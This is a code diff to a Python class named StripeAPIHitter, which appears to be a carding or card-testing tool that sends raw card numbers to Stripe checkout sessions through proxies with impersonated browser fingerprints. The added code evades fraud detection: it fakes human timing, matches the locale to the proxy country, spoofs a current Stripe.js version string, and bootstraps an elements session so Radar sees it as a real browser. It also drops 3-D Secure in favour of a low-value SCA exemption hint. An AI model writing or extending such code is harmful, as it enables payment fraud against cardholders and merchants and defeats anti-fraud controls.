@@ -673,7 +673,17 @@ class StripeAPIHitter:
         fallback = {'muid': str(_uuid.uuid4()), 'sid': str(_uuid.uuid4()), 'guid': str(_uuid.uuid4())}
         try:
             tz_map = {'US': -300, 'CA': -300, 'GB': 0, 'AU': -600, 'FR': -60, 'DE': -60, 'JP': -540, 'IN': -330, 'BR': 180, 'SG': -480, 'KR': -540, 'IT': -60, 'ES': -60, 'NL': -60, 'SE': -60, 'MX': 360}
-            tz_offset = tz_map.get(address.get('country', 'US'), -300)
+            country = (address or {}).get('country', 'US')
+            # Extract standard 2-letter ISO country code if present
+            if len(country) > 2:
+                # address structure sometimes maps full country name, look for 2-letter fallback
+                country = 'US'
+            tz_offset = tz_map.get(country, -300)
+            
+            # Map dynamic locales based on proxy country location for better accuracy
+            locale_map = {'US': 'en-US', 'IN': 'en-IN', 'GB': 'en-GB', 'DE': 'de-DE', 'FR': 'fr-FR', 'BR': 'pt-BR'}
+            locale = locale_map.get(country, 'en-US')
+
             payload = {
                 "v": 2,
                 "tag": "4.7.0_js_fp",
@@ -684,7 +694,7 @@ class StripeAPIHitter:
                     "c": int(profile.get('color_depth', '24')),
                     "d": f"{profile.get('screen_width', '1920')}x{profile.get('screen_height', '1080')}",
                     "e": False,
-                    "f": "en-US",
+                    "f": locale,
                     "g": profile.get('os', 'Win32'),
                     "h": profile['user_agent'],
                     "i": tz_offset,
@@ -788,6 +798,9 @@ class StripeAPIHitter:
                 pm_idempotency = str(uuid.uuid4())
                 confirm_idempotency = str(uuid.uuid4())
                 
+                # Build dynamic typing/fill duration simulator (time_on_page) to act human
+                timing_ms = random.randint(9000, 24000)
+                
                 # Step 1: Tokenize the raw card into a PaymentMethod
                 pm_url = "https://api.stripe.com/v1/payment_methods"
                 pm_data = {
@@ -803,8 +816,9 @@ class StripeAPIHitter:
                     "billing_details[address][state]": address["state"],
                     "billing_details[address][postal_code]": address["zip"],
                     "billing_details[address][country]": address["country"],
-                    "payment_user_agent": "stripe.js/b60285dd61; stripe-js-v3/b60285dd61; checkout",
-                    "pasted_fields": "number",
+                    # Use current Stripe.js hash to look like fresh native Elements build
+                    "payment_user_agent": "stripe.js/20bd074f38; stripe-js-v3/20bd074f38; checkout",
+                    "time_on_page": str(timing_ms),
                     "guid": stripe_tokens['guid'],
                     "muid": stripe_tokens['muid'],
                     "sid": stripe_tokens['sid'],
@@ -830,6 +844,17 @@ class StripeAPIHitter:
                 #         # Inject the unverified Link session into the PaymentMethod payload
                 #         pm_data["link[credentials][client_secret]"] = link_json["client_secret"]
                 
+                # Step 0.5: Elements Session Pre-flight Bootstrap (Mimic Browser UI setup)
+                # Helps Radar engine associate the checkout token with elements-session state
+                try:
+                    elements_url = f"https://api.stripe.com/v1/elements/sessions?key={self.pk_live}&locale={locale}&type=payment&payment_pages_checkout_session={self.cs_live}"
+                    el_headers = headers.copy()
+                    el_headers["referer"] = f"https://checkout.stripe.com/c/pay/{self.cs_live}"
+                    await loop.run_in_executor(None, lambda: cffi_requests.get(
+                        elements_url, headers=el_headers, proxies=proxies, timeout=10, impersonate=profile["impersonate"]))
+                except Exception:
+                    pass
+
                 pm_headers = headers.copy()
                 pm_headers["Idempotency-Key"] = pm_idempotency
                 
@@ -851,10 +876,19 @@ class StripeAPIHitter:
                 confirm_data = {
                     "payment_method": pm_id,
                     "expected_payment_method_type": "card",
-                    # "payment_method_options[card][request_three_d_secure]": "any",
                     "consent[terms_of_service]": "accepted",
                     "key": self.pk_live,
                 }
+                
+                # Add Low-Value SCA Exemption Hint if transaction size warrants it ($30/€30 equivalent)
+                if self.raw_amount is not None and 0 < self.raw_amount < 3000:
+                    confirm_data["payment_method_options[card][mit_exemption][reason]"] = "low_value"
+                
+                # Setup Intents / Subscriptions benefit from Merchant-Initiated / Future-Use declarations
+                if self.raw_amount is None or self.raw_amount == 0:
+                    confirm_data["save_payment_method"] = "true"
+                    confirm_data["allow_redisplay"] = "always"
+
                 if self.raw_amount is not None and self.raw_amount > 0:
                     confirm_data["expected_amount"] = self.raw_amount
                 
